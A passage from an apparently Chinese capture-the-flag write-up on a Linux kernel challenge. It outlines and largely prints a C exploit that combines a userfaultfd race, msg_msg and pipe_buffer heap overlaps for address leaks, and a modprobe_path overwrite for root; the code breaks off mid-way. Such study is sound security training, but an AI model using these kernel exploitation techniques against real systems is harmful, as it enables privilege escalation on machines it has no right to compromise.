<span class="number">32</span> )                               <span class="comment">// alloc</span></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  <span class="keyword">if</span> ( copy_from_user(&amp;v13, v2, <span class="number">16LL</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( addFlags &gt; <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  v5 = kmem_cache_alloc_trace(kmalloc_caches[<span class="number">10</span>], <span class="number">3264LL</span>, <span class="number">1024LL</span>);</span><br><span class="line">  v6 = v5;</span><br><span class="line">  <span class="keyword">if</span> ( !v5 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  v7 = copy_from_user(v5, v14, <span class="number">1024LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v7 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = (<span class="type">int</span>)v7;</span><br><span class="line">    <span class="keyword">if</span> ( !addrList[v7] )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( ++v7 == <span class="number">32</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  ++addFlags;</span><br><span class="line">  result = <span class="number">0LL</span>;</span><br><span class="line">  addrList[v8] = v6;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>这题调试了一下应该是没有开启random_list和Hardened freelist的,并且CONFIG_MEMCG_KMEM=n</p><p>每个皆只能使用两次</p><ol><li>注册两个userfaultfd,分别用于两次条件竞争,开启两个线程与userfaultfd配合</li><li>第一次add一个obj0,然后edit触发条件竞争,释放掉obj0又将其申请为msg_msg结构体(除这个外还需要再申请一个相同的),然后userfaultfd默认缺页处理操作填充内容时覆盖msg_msg的header字段</li><li>再申请pipe,其pipe_buffer刚好又位于msg_msg的后方,此时读取msg_msg便能够泄露pipe_buffer的内容,也就能够泄露kernel代码段基址,然后又能够通过之前申请的另一个msg_msg的prev字段获得内核堆地址</li><li>第二次add一个obj1,再次edit触发条件竞争,又将obj1释放,然后缺页处理函数填充内容时刚好覆盖掉obj的next指针为modprobe_path的地址</li><li>然后构造好modprobe_path,这里因为会将obj置零,所以有些关键数据需要手动恢复(特别是kmod相关的)</li><li>然后再两次申请msg_msg即可劫持</li><li>触发modprobe</li></ol><p><strong>exp:</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CLOSE printf(<span class="string">&quot;\033[0m&quot;</span>);</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RED printf(<span class="string">&quot;\033[31m&quot;</span>);</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GREEN printf(<span class="string">&quot;\033[36m&quot;</span>);</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BLUE printf(<span class="string">&quot;\033[34m&quot;</span>);</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> real(a) a+kernel_base-0xffffffff81000000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SIZE 0X1000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MSG_COPY        040000</span></span><br><span class="line"> </span><br><span class="line"><span class="type">size_t</span> fd;</span><br><span class="line"><span class="type">size_t</span> kernel_base;</span><br><span class="line"><span class="type">size_t</span> tmp_buf[<span class="number">0x500</span>];</span><br><span class="line"><span class="type">char</span> *msg_buf;</span><br><span class="line"><span class="type">size_t</span> fake_ops_buf[<span class="number">0x100</span>];</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> ms_qid[<span class="number">0x100</span>];</span><br><span class="line"><span class="type">int</span> pipe_fd[<span class="number">0x20</span>][<span class="number">2</span>];</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="type">sem_t</span> sem_addmsg;</span><br><span class="line"><span class="type">sem_t</span> sem_editmsg;</span><br><span class="line"><span class="type">sem_t</span> edit_down;</span><br><span class="line"><span class="type">sem_t</span> edit_heap_next;</span><br><span class="line"><span class="type">sem_t</span> sem_edit_msg_for_modpath;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> &#123;</span></span><br><span class="line">    <span class="type">size_t</span>    next;</span><br><span class="line">    <span class="type">size_t</span>    prev;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">    <span class="type">size_t</span>    m_type;</span><br><span class="line">    <span class="type">size_t</span>    m_ts;</span><br><span class="line">    <span class="type">size_t</span>    next;</span><br><span class="line">    <span class="type">size_t</span>    security;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> &#123;</span></span><br><span class="line">    <span class="type">size_t</span>    next;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">// struct msgbuf &#123;</span></span><br><span class="line"><span class="comment">//     long mtype;</span></span><br><span class="line"><span class="comment">//     char mtext[0];</span></span><br><span class="line"><span class="comment">// &#125;;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">getMsgQueue</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">readMsg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> msgrcv(msqid, msgp, msgsz, msgtyp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * the msgp should be a pointer to the `struct msgbuf`,</span></span><br><span class="line"><span class="comment"> * and the data should be stored in msgbuf.mtext</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">writeMsg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span></span><br><span class="line">&#123;</span><br><span class="line">    ((<span class="keyword">struct</span> msgbuf*)msgp)-&gt;mtype = msgtyp;</span><br><span class="line">    <span class="keyword">return</span> msgsnd(msqid, msgp, msgsz, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* for MSG_COPY, `msgtyp` means to read no.msgtyp msg_msg on the queue */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">peekMsg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> msgrcv(msqid, msgp, msgsz, msgtyp,</span><br><span class="line">                  MSG_COPY | IPC_NOWAIT | MSG_NOERROR);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">buildMsg</span><span class="params">(<span class="keyword">struct</span> msg_msg *msg, <span class="type">size_t</span> m_list_next, <span class="type">size_t</span> m_list_prev,</span></span><br><span class="line"><span class="params">              <span class="type">size_t</span> m_type, <span class="type">size_t</span> m_ts,  <span class="type">size_t</span> next, <span class="type">size_t</span> security)</span></span><br><span class="line">&#123;</span><br><span class="line">    msg-&gt;m_list.next = m_list_next;</span><br><span class="line">    msg-&gt;m_list.prev = m_list_prev;</span><br><span class="line">    msg-&gt;m_type = m_type;</span><br><span class="line">    msg-&gt;m_ts = m_ts;</span><br><span class="line">    msg-&gt;next = next;</span><br><span class="line">    msg-&gt;security = security;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">delete</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">size_t</span> idx;</span><br><span class="line">&#125;delete_arg;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">edit</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">size_t</span> idx;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">    <span class="type">char</span> *content;</span><br><span class="line">&#125;edit_arg;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">add</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">size_t</span> idx;</span><br><span class="line">    <span class="type">char</span> *content;</span><br><span class="line">&#125;add_arg;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">ErrExit</span><span class="params">(<span class="type">char</span>* err_msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(err_msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">(<span class="type">char</span> *content)</span></span><br><span class="line">&#123;</span><br><span class="line">    add_arg tmp=</span><br><span class="line">    &#123;</span><br><span class="line">        .content = content,</span><br><span class="line">    &#125;;</span><br><span class="line"> </span><br><span class="line">    ioctl(fd,<span class="number">0x20</span>,&amp;tmp);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">(<span class="type">size_t</span> idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    delete_arg tmp=</span><br><span class="line">    &#123;</span><br><span class="line">        .idx=idx,</span><br><span class="line">    &#125;;</span><br><span class="line"> </span><br><span class="line">    ioctl(fd,<span class="number">0x30</span>,&amp;tmp);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">edit</span><span class="params">(<span class="type">size_t</span> idx,<span class="type">size_t</span> size,<span class="type">char</span> *content)</span></span><br><span class="line">&#123;</span><br><span class="line">    edit_arg tmp=</span><br><span class="line">    &#123;</span><br><span class="line">        .idx=idx,</span><br><span class="line">        .size = size,</span><br><span class="line">        .content=content,</span><br><span class="line">    &#125;;</span><br><span class="line"> </span><br><span class="line">    ioctl(fd,<span class="number">0x50</span>,&amp;tmp);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">leak</span><span class="params">(<span class="type">size_t</span> *content,<span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]Leak: &quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;(<span class="type">int</span>)(size/<span class="number">8</span>);i++)</span><br><span class="line">    &#123;</span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">&quot;%llx\n&quot;</span>,content[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">RegisterUserfault</span><span class="params">(<span class="type">void</span> *fault_page, <span class="type">void</span>* handler)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">pthread_t</span> thr;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">ua</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">ur</span>;</span></span><br><span class="line">    <span class="type">size_t</span> uffd  = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    ua.api = UFFD_API;</span><br><span class="line">    ua.features    = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;ua) == <span class="number">-1</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    ur.range.start = (<span class="type">unsigned</span> <span class="type">long</span>)fault_page; <span class="comment">//我们要监视的区域</span></span><br><span class="line">    ur.range.len   = PAGE_SIZE;</span><br><span class="line">    ur.mode        = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == <span class="number">-1</span>) <span class="comment">//注册缺页错误处理，当发生缺页时，程序会阻塞，此时，我们在另一个线程里操作</span></span><br><span class="line">        ErrExit(<span class="string">&quot;[-] ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line">    <span class="comment">//开一个线程，接收错误的信号，然后处理</span></span><br><span class="line">    <span class="type">int</span> s = pthread_create(&amp;thr, <span class="literal">NULL</span>,handler, (<span class="type">void</span>*)uffd);</span><br><span class="line">    <span class="keyword">if</span> (s!=<span class="number">0</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] pthread_create&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">char</span> *page = <span class="literal">NULL</span>; <span class="comment">// 你要拷贝进去的数据</span></span><br><span class="line"><span class="type">static</span> <span class="type">char</span> *buf = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">char</span> *buf2 = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">char</span> *buf3 = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">long</span> page_size;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *</span><br><span class="line"><span class="title function_">fault_handler_thread</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> uffd = (<span class="type">unsigned</span> <span class="type">long</span>) arg;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] sleep3 handler created&quot;</span>);</span><br><span class="line">    <span class="type">int</span> nready;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">    pollfd.fd = uffd;</span><br><span class="line">    pollfd.events = POLLIN;</span><br><span class="line">    nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] sleep3 handler unblocked&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    sem_post(&amp;sem_addmsg);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (nready != <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] Wrong poll return val&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    nready = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">    <span class="keyword">if</span> (nready &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] msg err&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    sem_wait(&amp;sem_editmsg);</span><br><span class="line"> </span><br><span class="line">    <span class="type">char</span>* page = (<span class="type">char</span>*) mmap(<span class="literal">NULL</span>, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (page == MAP_FAILED)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] mmap err&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line">    <span class="comment">// init page</span></span><br><span class="line">    <span class="built_in">memset</span>(page, <span class="number">0</span>, <span class="keyword">sizeof</span>(page));</span><br><span class="line">    <span class="built_in">memset</span>(tmp_buf, <span class="number">0</span>, <span class="number">0x50</span>);</span><br><span class="line">    tmp_buf[<span class="number">3</span>] = <span class="number">0xd00</span>;</span><br><span class="line">    <span class="built_in">memcpy</span>(page,tmp_buf,<span class="number">0x50</span>);</span><br><span class="line">    <span class="comment">// strcpy(page,&quot;Lotus_just_Test&quot;);</span></span><br><span class="line">    uc.src = (<span class="type">unsigned</span> <span class="type">long</span>) page;</span><br><span class="line">    uc.dst = (<span class="type">unsigned</span> <span class="type">long</span>) msg.arg.pagefault.address &amp; ~(PAGE_SIZE - <span class="number">1</span>);</span><br><span class="line">    uc.len = PAGE_SIZE;</span><br><span class="line">    uc.mode = <span class="number">0</span>;</span><br><span class="line">    uc.copy = <span class="number">0</span>;</span><br><span class="line">    ioctl(uffd, UFFDIO_COPY, &amp;uc);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] sleep3 handler done&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">UAF</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span 